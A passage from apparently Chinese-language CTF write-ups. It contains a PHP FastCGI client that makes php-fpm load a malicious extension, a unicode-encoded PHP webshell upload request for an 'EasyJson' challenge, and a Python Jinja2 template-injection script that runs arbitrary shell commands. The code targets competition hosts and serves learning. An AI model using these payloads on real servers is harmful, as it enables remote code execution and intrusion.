$offset, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);<br>            $segLen = strlen($part);<br>            $buf .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span><br>                . chr($type)                    <span class="hljs-comment">/* type */</span><br>                . chr(($requestId &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>                . chr($requestId &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>                . chr(($segLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span><br>                . chr($segLen &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>                . $part;                        <span class="hljs-comment">/* content */</span><br>            $offset += $segLen;<br>        &#125; <span class="hljs-keyword">while</span> ($offset &lt; $totLen);<br>        <span class="hljs-keyword">return</span> $buf;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params">$name, $value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $nlen = strlen($name);<br>        $vlen = strlen($value);<br>        <span class="hljs-keyword">if</span> ($nlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            $nvpair = chr($nlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            $nvpair = chr(($nlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($nlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($vlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            $nvpair .= chr($vlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            $nvpair .= chr(($vlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($vlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> $nvpair . $name . $value;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params">$data, $length = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ($length === <span class="hljs-literal">null</span>) &#123;<br>            $length = strlen($data);<br>        &#125;<br>        $array = <span class="hljs-keyword">array</span>();<br>        $p = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ($p != $length) &#123;<br>            $nlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($nlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $nlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $vlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($vlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $vlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);<br>            $p += ($nlen + $vlen);<br>        &#125;<br>        <span class="hljs-keyword">return</span> $array;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $params, $stdin</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;<br>            &#125;<br>            $id = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[$id]));<br>        $request = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), $id);<br>        $paramsRequest = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>            $paramsRequest .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair($key, $value, $id);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($paramsRequest) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, $paramsRequest, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">if</span> ($stdin) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, $stdin, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">return</span> $request;<br>    &#125;<br>&#125;<br>$sock = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);<br>$client = <span class="hljs-keyword">new</span> Client();<br>$payload_file = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;<br>$params = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,<br>    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,<br>    <span class="hljs-comment">//è¿™é‡Œ$payload_fileã€‚æ˜¯æˆ‘ä»¬è°ƒç”¨æ¶æ„soæ‰§è¡Œçš„phpå‘½ä»¤ã€‚extension_diræ˜¯æ‰©å±•ç›®å½•extensionæ˜¯æ‰©å±•å</span><br>);<br>$data = $client-&gt;buildAllPacket($params, <span class="hljs-string">&#x27;&#x27;</span>);<br>fwrite($sock, $data);<br>var_dump(fread($sock, <span class="hljs-number">4096</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>s.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> antsystem(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>ä»ä¸€é“CTFå­¦ä¹ Fastcgiç»•è¿‡å§¿åŠ¿ï¼š<a href="https://www.anquanke.com/post/id/186186#h2-4">https://www.anquanke.com/post/id/186186#h2-4</a></li><li>2019 0ctf final Web Writeupï¼ˆ1ï¼‰ï¼š<a href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></li><li>php è‡ªå®šä¹‰æ¶æ„æ‰©å±• so ç¼–å†™è¿‡ç¨‹ï¼š<a href="https://xz.aliyun.com/t/7330#toc-3">https://xz.aliyun.com/t/7330#toc-3</a></li><li>Fastcgi åè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™ï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </li><li>è¥¿æ¹–è®ºå‰‘åˆèµ›Web1/5ï¼š<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol><hr><h1 id="EasyJsonï¼ˆphp-å®¡è®¡ï¼‰"><a href="#EasyJsonï¼ˆphp-å®¡è®¡ï¼‰" class="headerlink" title="EasyJsonï¼ˆphp å®¡è®¡ï¼‰"></a>EasyJsonï¼ˆphp å®¡è®¡ï¼‰</h1><p><strong>åŸºæœ¬æ­¥éª¤</strong></p><ul><li>filename=index.php å¯è¿‡ check</li><li>ä½¿ç”¨ application/json ç±»å‹çš„ enctype å‘é€æ„é€ å¥½çš„æ•°æ®åŒ…</li><li>ä½¿ç”¨ burpsuite å°†å…³é”®ä»£ç è½¬ unicodeï¼Œå‘é€åå¾—åˆ°åœ°å€ã€‚(ä¸ç”¨æ”¹ x-Forward-For ä¹Ÿå¯ä»¥)</li><li>æ‰§è¡Œå‘½ä»¤ï¼š<br><a href="http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag</a></li><li>å¾—åˆ° flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li></ul><p><strong>é¢˜ç›®æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;security.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>$sandbox = <span class="hljs-string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>var_dump($sandbox);<br><span class="hljs-keyword">if</span>(!file_exists($sandbox))&#123;<br>    mkdir($sandbox);<br>    file_put_contents($sandbox.<span class="hljs-string">&quot;index.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);<br>&#125;<br>$action = $_GET[<span class="hljs-string">&#x27;action&#x27;</span>];<br>$content = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><br><span class="hljs-keyword">if</span>($action == <span class="hljs-string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="hljs-string">&#x27;filename&#x27;</span>,$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="hljs-string">&#x27;content&#x27;</span>,$content))&#123;<br>    $content = json_decode($content);<br>    $filename = $_GET[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    $filecontent = $content-&gt;content;<br>    $filename = $sandbox.$filename;<br>    file_put_contents($filename,$filecontent.<span class="hljs-string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<br>&#125;<span class="hljs-keyword">elseif</span>($action == <span class="hljs-string">&quot;reset&quot;</span>)&#123;<br>    $files = scandir($sandbox);<br>    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) &#123;<br>        <span class="hljs-keyword">if</span>(!is_dir($file))&#123;<br>            <span class="hljs-keyword">if</span>($file !== <span class="hljs-string">&quot;index.php&quot;</span>)&#123;<br>                unlink($sandbox.$file);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Security Check Failed.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åŒ…</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?source=1&amp;action=write&amp;filename=index.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: easyjson.xhlj.wetolink.com<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">Cache-Control</span>: max-age=0<br><span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1<br><span class="hljs-attribute">X-Originating-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-Addr</span>: 127.0.0.1<br><span class="hljs-attribute">Content-Length</span>: 191<br><br>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li>è¥¿æ¹–è®ºå‰‘åˆèµ›Web1/5ï¼š<a href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020å¹´9æœˆDownUnderCTF</title>
    <link href="/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-DownUnderCTF/"/>
    <url>/2020/09/30/2020%E5%B9%B49%E6%9C%8830%E6%97%A5-DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<p>å®˜æ–¹ writeup åœ°å€ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public">https://github.com/DownUnderCTF/Challenges_2020_public</a><br>é¢˜ç›®åœ°å€ï¼š<a href="https://play.duc.tf/challenges">https://play.duc.tf/challenges</a></p><hr><a id="more"></a><h1 id="Web-Badminï¼ˆDNSé…ç½®ï¼‰"><a href="#Web-Badminï¼ˆDNSé…ç½®ï¼‰" class="headerlink" title="Web Badminï¼ˆDNSé…ç½®ï¼‰"></a>Web Badminï¼ˆDNSé…ç½®ï¼‰</h1><p>é¢˜ç›®ï¼šweb badmin</p><p>æç¤ºï¼šWe launched a game and now it is no longer launched :( can you figure out what happened plox. HALP</p><p>è§†é¢‘ä¸Šæ–¹ï¼šme rnã€‚windows</p><p>æ³¨é‡Šï¼š<code>&lt;!-- &lt;a href=&quot;https://epicgame.play.duc.tf&quot;&gt;Play our new game here!&lt;/a&gt; --&gt;</code>ï¼Œæ³¨é‡Šä¸­çš„ç½‘ç«™æ— æ³•æ‰“å¼€</p><p>beep boopï¼šå“”å“”å£°</p><p>æ²¡æœ‰cookie</p><p>hintï¼šBoss: we are firing you. The game doesnâ€™t even load. Web admin: it was just a simple misconfiguration, i clicked the wrong button ğŸ˜</p><p>å‘ç°æ³¨é‡Šä¸­æœ‰æç¤ºä¿¡æ¯ï¼Œä½¿ç”¨æµè§ˆå™¨ã€pingå·¥å…·ã€curlå·¥å…·ï¼ˆå‡ ç§å¸¸ç”¨çš„å·¥å…·ï¼‰éƒ½æ²¡æœ‰ä»»ä½•å“åº”ï¼ŒæŸæ‰‹æ— ç­–ã€‚</p><p>æœ€åæŸ¥çœ‹é¢˜è§£æ‰çŸ¥é“ï¼Œæ— æ³•è¿æ¥æ˜¯ç”±äºDNSçš„åŸå› ï¼Œä½¿ç”¨digã€hostå³å¯è·å¾—flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>host -t txt epicgame.play.duc.tf<br><br>dig epicgame.play.duc.tf TXT         <span class="hljs-comment"># dig å‘½ä»¤ä¸»è¦ç”¨æ¥ä» DNS åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ä¸»æœºåœ°å€ä¿¡æ¯ã€‚</span><br><br></code></pre></td></tr></table></figure><p>åœ¨ DNS åè®®ä¸­æœ‰å¾ˆå¤šçš„èµ„æºåè®®ç±»å‹ï¼ŒTXT å±äºå…¶ä¸­ä¸€ç§ã€‚</p><ul><li>Aè®°å½• - ä¿å­˜åŸŸçš„IPåœ°å€çš„è®°å½•ã€‚</li><li>CNAMEè®°å½• - å°†ä¸€ä¸ªåŸŸæˆ–å­åŸŸè½¬å‘åˆ°å¦ä¸€ä¸ªåŸŸï¼Œä¸æä¾›IPåœ°å€ã€‚</li><li>MXè®°å½• - å°†é‚®ä»¶å®šå‘åˆ°ç”µå­é‚®ä»¶æœåŠ¡å™¨ã€‚</li><li>TXTè®°å½• - å…è®¸ç®¡ç†å‘˜åœ¨è®°å½•ä¸­å­˜å‚¨æ–‡æœ¬æ³¨é‡Šã€‚</li><li>NSè®°å½• - å­˜å‚¨DNSæ¡ç›®çš„åç§°æœåŠ¡å™¨ã€‚</li><li>SRVè®°å½• - æŒ‡å®šç‰¹å®šæœåŠ¡çš„ç«¯å£ã€‚</li></ul><hr><h1 id="Robotsssï¼ˆSSTIï¼‰"><a href="#Robotsssï¼ˆSSTIï¼‰" class="headerlink" title="Robotsssï¼ˆSSTIï¼‰"></a>Robotsssï¼ˆSSTIï¼‰</h1><p>é¢˜ç›®åœ°å€ï¼š<a href="https://chal.duc.tf:30106/">https://chal.duc.tf:30106/</a><br>Us robot devs use better templates than those stupid humans!</p><p>æ³¨å†Œå¹¶ç™»é™†ç³»ç»Ÿï¼Œå¯ä»¥å¾—åˆ°ä¸¤ä¸ªæç¤ºä¿¡æ¯ã€‚ç¬¬ä¸€ä¸ªä¿¡æ¯æš—ç¤º humans.txt ä¸­æœ‰å…¶ä»–ä¿¡æ¯ï¼ˆ<code>dirsearch</code> å·¥å…·ä¹Ÿå¯ä»¥æ‰«åˆ°ï¼‰ï¼Œç¬¬äºŒä¸ªæç¤ºæš—ç¤º flag ä½äº /s3cr3t_p4th/robot_fl4g.txtã€‚åœ¨ç¬¬ä¸€ä¸ªæç¤ºçš„æºç ä¸­æœ‰ä¸€ä¸²äºŒè¿›åˆ¶ç ï¼Œè§£ç å¯å¾— humen.txtï¼ˆäºŒè¿›åˆ¶è½¬asciiï¼‰ï¼Œç¬¬äºŒç¯‡æ–‡ç« çš„äºŒè¿›åˆ¶è§£ç å¾— fl4g.txtã€‚</p><p>æ ¹æ®ç¬¬ä¸€ä¸ªæš—ç¤ºæˆ‘ä»¬æ‰¾åˆ°å¦ä¸€ä¸ªåœ°å€(<a href="https://chal.duc.tf:30106/4dm1n_Cr3ds)%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%BB%99%E5%87%BA%E4%B8%80%E6%AE%B5">https://chal.duc.tf:30106/4dm1n_Cr3ds)ï¼Œè¿™ä¸ªåœ°å€ç»™å‡ºä¸€æ®µ</a> admin credit ä¸º 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</p><p>è®¿é—® humen.txt åœ°å€å‘ç°ä¸€å¼ å›¾ç‰‡ï¼Œä½¿ç”¨ <code>strings</code> å·¥å…·å¤„ç†å›¾ç‰‡ï¼ˆ<code>binwalk</code>ã€<code>foremost</code> éƒ½æµ‹è¯•è¿‡ï¼‰ï¼Œå¾—åˆ°ä¸€ä¸²äºŒè¿›åˆ¶ç </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001</span><br><br></code></pre></td></tr></table></figure><p>è§£ç å¾—åˆ° admin:This-Is-The-Admin-Password-XD!ï¼Œçœ‹ä¸Šå»å¾ˆåƒæ˜¯è´¦å·å¯†ç ã€‚</p><p>ä½¿ç”¨ admin è´¦å·ç™»é™†æˆåŠŸã€‚å‰å‡ å¤©åšäº†å¾ˆå¤šå‘½ä»¤æ³¨å…¥çš„é¢˜ç›®ï¼ˆ<code>Python</code>ã€<code>Java</code>ï¼‰ï¼Œä»¥ä¸ºè¿™ä¸ªé¢˜ç›®è¿˜æ˜¯å‘½ä»¤æ³¨å…¥ï¼Œæœ€åå‘ç°æ˜¯æ¨¡ç‰ˆæ³¨å…¥ã€‚å¹¶ä¸”è¿˜åœ¨æ§åˆ¶å°å‘ç°ï¼šWerkzeug/0.16.0 Python/3.7.9ã€‚</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;1+1&#125;&#125;                  =&gt; jinja2 <br>&#x27;a&#x27;&#x27;a&#x27;                   =&gt; shell <br>&#x27;a&#x27;.length               =&gt; js <br>len(&#x27;a&#x27;)                 =&gt; python <br>&#x27;a&#x27;.charAt(0)            =&gt; java<br><br>&#123;&#123;1+1&#125;&#125;                  =&gt; æ¨¡ç‰ˆæ³¨å…¥<br></code></pre></td></tr></table></figure><p>æœ€åæ ¹æ®æ¼æ´ç‰¹æ€§æ„é€  expã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    get_para = <span class="hljs-string">&#x27;a=__class__&amp;&amp;b=__mro__&amp;&amp;c=__getitem__&amp;&amp;d=__subclasses__&amp;&amp;e=__init__&amp;&amp;f=__globals__&#x27;</span><br>    <span class="hljs-comment"># get_para = &#x27;&#x27;</span><br>    <span class="hljs-comment"># post_para = input(&#x27;POST:&#x27;)</span><br>    cmd = input(<span class="hljs-string">&#x27;cmd:&#x27;</span>)<br>    post_para = <span class="hljs-string">&quot;&#123;&#123; &#x27;&#x27;|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1)|attr(request.args.d)()|attr(request.args.c)(127)|attr(request.args.e)|attr(request.args.f)|attr(request.args.c)(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="hljs-string">&quot;&#x27;)|attr(&#x27;read&#x27;)() &#125;&#125;&quot;</span><br><br>    base_url = <span class="hljs-string">&#x27;https://chal.duc.tf:30106/admin.php?&#x27;</span> + get_para<br><br>    resp = requests.post(<br>        url=base_url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;user_in&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> + post_para + <span class="hljs-string">&#x27;&#x27;</span><br>        &#125;,<br>        cookies=&#123;<br>            <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;.eJwlzjsOwjAMANC7eO5gO4kT9zJV4o9gbemEuDtIrG96bzjyjOsB--u8Y4Pj6bDDGNU4F7EnEkntWEiwhok3CfyJUS_ckigxQ1pxr5pNcxrqIp_K4itqFF02zSZLH73ZQPeCGD2YURZiGaJ1tjXWbEO465wFFTa4rzj_GYLPF1GiLjY.X2bocA.l7FpHpE9qJ_HHpRBtjQGgDwGd0Y&#x27;</span>&#125;<br>    )<br><br>    soup = BeautifulSoup(markup=resp.content, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>    print(<span class="hljs-string">f&#x27;result: <span class="hljs-subst">&#123;soup.find(<span class="hljs-string">&quot;p&quot;</span>).get_text()&#125;</span>&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;-------------------------------------------------------&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>æˆåŠŸ getshellï¼Œå¹¶å¾—åˆ° flag<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200930102222.png"></p><p>å®˜æ–¹é¢˜è§£ï¼š<a href="https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss">https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/web/robotssss</a></p><p>é€šè¿‡é¢˜è§£å¯çŸ¥ï¼Œ6zMLV46JRp6kAmTs3nx5AG4WJgYeY ä¸º <code>base58</code> ç¼–ç ï¼Œå¯ä»¥é€šè¿‡ <code>&#123;&#123; config.items() &#125;&#125;</code> æŸ¥çœ‹ç³»ç»Ÿé…ç½®ä¿¡æ¯ï¼Œé…ç½®ä¿¡æ¯ä¸­çš„å‡½æ•°ç”¨äºæš—ç¤ºè¯¥å‡½æ•°å¯ä»¥ä½¿ç”¨ã€‚è¿˜å¯ä»¥ä½¿ç”¨ Jinja è‡ªå¸¦çš„è¯­æ³•ï¼ˆ<code>&#123;&#123; getFile("/fl4g.txt") &#125;&#125;</code>ï¼‰æ¥è¯»å– flag æ–‡ä»¶ã€‚</p><hr><h1 